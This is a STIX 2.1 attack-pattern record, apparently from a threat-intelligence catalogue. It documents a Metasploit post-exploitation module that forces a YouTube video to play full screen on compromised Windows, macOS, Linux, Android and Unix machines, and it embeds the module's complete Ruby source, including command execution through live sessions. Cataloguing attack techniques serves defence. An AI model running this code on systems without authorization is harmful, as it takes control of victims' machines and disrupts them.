{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--43926c57-1451-411a-acb5-b50dfd1309f1",
    "created": "2024-08-14T16:33:18.008235Z",
    "modified": "2024-08-14T16:33:18.008239Z",
    "name": "Multi Manage YouTube Broadcast",
    "description": " This module will broadcast a YouTube video on specified compromised systems. It will play the video in the target machine's native browser. The VID datastore option is the \"v\"",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/play_youtube.rb",
            "external_id": "play_youtube.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage YouTube Broadcast',\n        'Description' => %q{\n          This module will broadcast a YouTube video on specified compromised systems. It will play\n          the video in the target machine's native browser. The VID datastore option is the \"v\"\n          parameter in a YouTube video's URL.\n\n          Enabling the EMBED option will play the video in full screen mode through a clean interface\n          but is not compatible with all videos.\n\n          This module will create a custom profile for Firefox on Linux systems in the /tmp directory.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r' ],\n        'Platform' => [ 'win', 'osx', 'linux', 'android', 'unix' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Notes' => {\n          # ARTIFACTS_ON_DISK when the platform is linux\n          'SideEffects' => [ ARTIFACTS_ON_DISK, AUDIO_EFFECTS, SCREEN_EFFECTS ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              android_*\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('EMBED', [true, 'Use the embed version of the YouTube URL', true]),\n        OptString.new('VID', [true, 'The video ID to the YouTube video', 'kxopViU98Xo'])\n      ]\n    )\n  end\n\n  def youtube_url\n    if datastore['EMBED']\n      \"https://youtube.com/embed/#{datastore['VID']}?autoplay=1&loop=1&disablekb=1&modestbranding=1&iv_load_policy=3&controls=0&showinfo=0&rel=0\"\n    else\n      \"https://youtube.com/watch?v=#{datastore['VID']}\"\n    end\n  end\n\n  #\n  # The OSX version uses an apple script to do this\n  #\n  def osx_start_video(_id)\n    script = ''\n    script << %(osascript -e 'tell application \"Safari\" to open location \"#{youtube_url}\"' )\n    script << %(-e 'activate application \"Safari\"' )\n    script << %(-e 'tell application \"System Events\" to key code {59, 55, 3}')\n\n    begin\n      cmd_exec(script)\n    rescue EOFError\n      return false\n    end\n\n    true\n  end\n\n  #\n  # The Windows version uses the \"embed\" player to make sure IE won't download the SWF as an object\n  #\n  def win_start_video(_id)\n    iexplore_path = 'C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe'\n    begin\n      session.sys.process.execute(iexplore_path, \"-k #{youtube_url}\")\n    rescue Rex::Post::Meterpreter::RequestError\n      return false\n    end\n\n    true\n  end\n\n  #\n  # The Linux version uses Firefox\n  # TODO: Try xdg-open?\n  #\n  def linux_start_video(_id)\n    begin\n      # Create a profile\n      profile_name = Rex::Text.rand_text_alpha(8)\n      display = get_env('DISPLAY') || ':0'\n      vprint_status(\"Creating profile #{profile_name} using display #{display}\")\n      o = cmd_exec(%(firefox --display #{display} -CreateProfile \"#{profile_name} /tmp/#{profile_name}\"))\n\n      # Add user-defined settings to profile\n      s = %|\n      user_pref(\"dom.disable_open_during_load\", false);\n      user_pref(\"browser.shell.checkDefaultBrowser\", false);\n      |\n      write_file(\"/tmp/#{profile_name}/prefs.js\", s)\n\n      # Start the video\n      data_js = %|\"data:text/html,<script>window.open('#{youtube_url}','','width:100000px;height:100000px');</script>\"|\n      joe = \"firefox --display #{display} -p #{profile_name} #{data_js} &\"\n      cmd_exec(\"/bin/sh -c #{joe.shellescape}\")\n    rescue EOFError\n      return false\n    end\n\n    true\n  end\n\n  #\n  # The Android version is launched via an Intent\n  #\n  def android_start_video(id)\n    intenturl = \"intent://youtube.com/watch?v=#{id}&autoplay=1#Intent;scheme=http;action=android.intent.action.VIEW;end\"\n    begin\n      session.android.activity_start(intenturl)\n    rescue Rex::Post::Meterpreter::RequestError\n      return false\n    end\n    true\n  end\n\n  # The generic Unix version calls xdg-open(1) or open(1)\n  def unix_start_video(_id)\n    cmd_exec(\"xdg-open '#{youtube_url}' || open '#{youtube_url}'\")\n    true\n  rescue EOFError\n    false\n  end\n\n  def start_video(id)\n    case session.platform\n    when 'osx'\n      osx_start_video(id)\n    when 'windows'\n      win_start_video(id)\n    when 'linux'\n      linux_start_video(id)\n    when 'android'\n      android_start_video(id)\n    when 'unix'\n      unix_start_video(id)\n    end\n  end\n\n  def run\n    id = datastore['VID']\n\n    print_status(\"#{peer} - Spawning video...\")\n    if start_video(id)\n      print_good(\"#{peer} - The video has started\")\n    else\n      print_error(\"#{peer} - Unable to start the video\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ sinn3r ]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win', 'osx', 'linux', 'android', 'unix' ]"
    ]
}